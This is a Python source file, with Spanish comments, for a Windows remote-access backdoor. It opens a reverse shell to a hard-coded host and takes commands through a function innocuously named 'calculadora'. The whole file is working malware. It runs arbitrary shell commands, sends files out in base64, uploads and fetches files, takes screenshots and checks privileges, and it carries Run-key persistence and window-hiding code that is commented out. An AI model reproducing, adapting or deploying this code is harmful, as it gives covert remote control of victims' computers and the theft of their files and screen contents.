#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
from socket import error
from os import environ, path, listdir, sep, getcwd, chdir, remove
from subprocess import call, Popen, PIPE
import base64
from requests import get
from pyautogui import screenshot
import time
import shutil
import sys
import win32console
import win32gui
from getpass import getuser

def pasiempre():
	ruta = environ['appdata'] + '\\Default_.exe'
	if not path.exists(ruta):
		shutil.copyfile(sys.executable,ruta)
		call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Default_ /t REG_SZ /d "'+ ruta + '"', shell=True)
	else:
		pass

def administrador():
	global adm
	try:
		prueba = listdir(sep.join([environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		adm = "Error privilegios insuficientes"
	else:#Si se ejecuta try pasa a else
		del prueba
		adm = "Privilegios de administrador"

def captura():
	pantalla = screenshot()
	pantalla.save("monitor-1.png")#Crea siempre el arvhivo monitor-1.png
	time.sleep(1)

def descarga_web(url):#indicar url completa https://www.google.com/index.html
	consulta = get(url)
	archivo = url.split('/')[-1]#Split nos genera una lista separada por el caracter indicado
	with open(archivo,'wb') as descarga:
		descarga.write(consulta.content)#La clase .content contiene el archivo descargado
		descarga.close()

def envio_archivo (archivo_subir):
	if path.isfile(archivo_subir):
		print "Existe archivo"
		with open(archivo_subir,'rb') as file:
			print "Enviando..."
			data = file.read(4)
			try:
				while data:
					cliente.send(base64.b64encode(data))
					#print ("Porcion enviada..{}".format(len(data)))
					# time.sleep(0.5)
					data = file.read(4)
					#print ("Pordicon leida {}".format(len(data)))
					#print(type(data))
					if len(data) == 0:
						#cliente.send("")
						print ("len(data) = 0 retornamos")
						file.close()
						return
					else:
						continue
			except:
				print("Error en el envio")
				file.close()
				return
	else:
		return

def descarga_archivo(archivo_descarga):
	cliente.settimeout(5)
	try:
		with open(archivo_descarga,'wb') as file:
			print "Recibiendo..."
			while True:
				porcion = cliente.recv(4)
				file.write(base64.b64decode(porcion))
				#print ("Porcion escrita: {}".format(len(porcion)))
					
	except socket.error, e:
		if e[0] == 'timed out':
			print ("Tenemos archivo")
			return
	except:
		print ("Error de socket")
		return

def calculadora():

	while True:
		print "Esperando comando"
		res = None
		cliente.settimeout(None)
		try:
			res = cliente.recv(2048)
		except:
			pass

		if res == 'exit':
			main()

		elif res[:7] == "carpeta":
			carp_act = '\n' + socket.gethostname() + '-' + getuser() +'\n'+ getcwd()
			cliente.send(carp_act)
			continue			

		elif res[:2] == "cd" and len(res) > 2:
			try:
				chdir(res[3:])
				result = '\n' + socket.gethostname() + '-' + getuser() +'\n'+ getcwd()
				cliente.send(result)
			except:
				resutl = '\n' + socket.gethostname() + '-' + getuser() +'\n'+ getcwd()
				cliente.send(resutl)

		elif res[:8] == 'download':
			envio_archivo(res[9:])

		elif res[:6] == 'upload':
			print("llamamos a descarga archivo")
			descarga_archivo(res[7:])
			print("Regresamos a Shell")
		
		elif res[:3] == "get":
			try:
				descarga_web(res[4:])
				cliente.send("Archivo descargado correctamente")
			except:
				cliente.send("Error en la descarga del archivo")

		elif res[:7] == 'captura':
			try:
				captura()
			except:
				print ("Error al realizar la captura")
				continue
			envio_archivo('monitor-1.png')
			print ("Retornamos a shell, borramos captura")
			if path.isfile('monitor-1.png'):
				try:
					remove('monitor-1.png')
				except:
					continue
			else:
				continue
				
		elif res[:7] == 'ejecuta':
			try:
				pco = Popen(res[8:],shell=True,stderr=PIPE)
				cliente.send("Proceso ejecutado")
			except:
				cliente.send('1')

		elif res[:5] == "admin":
			try:
				administrador()
				cliente.send(adm)
			except:
				cliente.send("No se pudo comprobar")

		else:
			proc = Popen(res, shell = True,stdout=PIPE, stderr=PIPE, stdin=PIPE)
			resultado = proc.stdout.read() + proc.stderr.read()
			if len(resultado) == 0:
				cliente.send('1')
			else:
				cliente.send(resultado)
	else:
		print ("Salimos de shell")

def conexion():
	#pasiempre()
	print ("Entramos en conexion")
	global cliente
	cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	cliente.connect(("192.168.1.111",10443)) #MODIFICAR
	try:
		calculadora()
	except:
		main()
	finally:
		cliente.close()

def main():
	#ventana = win32console.GetConsoleWindow()
	#win32gui.ShowWindow(ventana,0)
	#pasiempre()
	while True:
		try:
			time.sleep(5)
			conexion()
		except:
			time.sleep(5)
			print ("Conexion no establecida")
			main()

if __name__ == '__main__':
	main()
